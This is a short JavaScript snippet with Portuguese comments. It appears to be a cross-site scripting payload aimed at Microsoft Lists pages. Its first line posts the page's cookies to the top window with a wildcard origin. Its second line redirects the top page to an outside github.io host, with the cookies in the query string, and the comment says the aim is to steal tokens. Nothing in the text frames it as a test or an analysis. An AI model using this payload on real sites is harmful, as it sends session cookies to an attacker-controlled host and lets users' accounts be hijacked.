// Enviar dados do Microsoft Lists, se possível
window.top.postMessage(document.cookie, '*');

// Ou redirecionar a página principal para roubar tokens
window.top.location = 'https://pedrojuniorrd.github.io/_layouts/payload.js?data=' + encodeURIComponent(document.cookie);
